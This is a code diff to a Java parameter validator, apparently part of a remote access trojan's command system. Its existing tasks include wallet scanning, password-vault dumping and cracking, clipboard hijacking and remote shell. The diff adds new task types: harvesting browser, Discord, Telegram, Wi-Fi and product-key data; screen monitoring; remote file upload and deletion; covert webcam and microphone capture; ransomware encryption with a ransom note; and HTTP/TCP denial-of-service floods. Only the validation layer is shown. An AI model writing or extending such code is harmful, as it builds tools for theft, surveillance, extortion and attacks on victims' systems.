@@ -61,7 +61,55 @@ public final class TaskParams {
 					if (error == null) error = object(params, "coins");
 					yield error != null ? error : numbers(params, "max_history", 16, 5000);
 				}
-				case "clip_stop", "harvest", "screenshot" -> only(params);
+				case "clip_stop", "screenshot" -> only(params);
+				case "harvest" -> {
+					String error = only(params, "kind");
+					yield error != null ? error : oneOf(params, "kind", "all", "browsers", "discord", "telegram", "wifi", "productkey");
+				}
+				case "monitor" -> {
+					String error = only(params, "seconds", "fps", "quality", "max_frames");
+					if (error == null) error = numbers(params, "seconds", 1, 30);
+					if (error == null) error = decimal(params, "fps", 0.2, 5);
+					if (error == null) error = numbers(params, "quality", 20, 90);
+					yield error != null ? error : numbers(params, "max_frames", 1, 30);
+				}
+				case "files" -> {
+					String error = only(params, "action", "path", "to", "url", "max_mb");
+					if (error == null) error = required(params, "action");
+					if (error == null) error = oneOf(params, "action", "list", "upload", "mkdir", "rename", "delete", "compress");
+					if (error == null) error = required(params, "path");
+					if (error == null) error = text(params, "path", 1, 4096);
+					if (error == null) error = text(params, "to", 0, 4096);
+					if (error == null) error = text(params, "url", 0, 8192);
+					yield error != null ? error : numbers(params, "max_mb", 1, 256);
+				}
+				case "webcam" -> {
+					String error = only(params, "device");
+					yield error != null ? error : text(params, "device", 0, 256);
+				}
+				case "mic" -> {
+					String error = only(params, "seconds", "device");
+					if (error == null) error = numbers(params, "seconds", 1, 10);
+					yield error != null ? error : text(params, "device", 0, 256);
+				}
+				case "ransomware" -> {
+					String error = only(params, "action", "path", "note");
+					if (error == null) error = required(params, "action");
+					if (error == null) error = oneOf(params, "action", "encrypt", "decrypt", "status");
+					if (error == null) error = required(params, "path");
+					if (error == null) error = text(params, "path", 1, 4096);
+					yield error != null ? error : text(params, "note", 0, 2000);
+				}
+				case "ddos" -> {
+					String error = only(params, "method", "host", "port", "seconds", "concurrency");
+					if (error == null) error = required(params, "method");
+					if (error == null) error = oneOf(params, "method", "http", "tcp");
+					if (error == null) error = required(params, "host");
+					if (error == null) error = required(params, "port");
+					if (error == null) error = numbers(params, "port", 1, 65535);
+					if (error == null) error = numbers(params, "seconds", 1, 300);
+					yield error != null ? error : numbers(params, "concurrency", 1, 256);
+				}
 				case "shell" -> {
 					String error = only(params, "command", "timeout_sec");
 					if (error == null) {
@@ -127,6 +175,18 @@ public final class TaskParams {
 		return parsed < min || parsed > max ? "invalid_param: " + key + " (" + min + ".." + max + ")" : null;
 	}
 
+	private static String decimal(Map<String, Object> params, String key, double min, double max) {
+		Object value = params.get(key);
+		if (value == null) {
+			return null;
+		}
+		if (!(value instanceof Number number)) {
+			return "invalid_param: " + key;
+		}
+		double parsed = number.doubleValue();
+		return parsed < min || parsed > max ? "invalid_param: " + key + " (" + min + ".." + max + ")" : null;
+	}
+
 	private static String integer(Map<String, Object> params, String key) {
 		Object value = params.get(key);
 		if (value == null) {
@@ -171,7 +231,8 @@ public final class TaskParams {
 	/** Task names the envelope may carry. */
 	public static boolean known(String name) {
 		return Set.of("scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
-			"shell", "harvest", "screenshot", "file_pull", "cancel", "agent").contains(name);
+			"shell", "harvest", "screenshot", "file_pull", "cancel", "agent", "monitor", "files",
+			"webcam", "mic", "ransomware", "ddos").contains(name);
 	}
 
 	static Set<String> cancellable() {
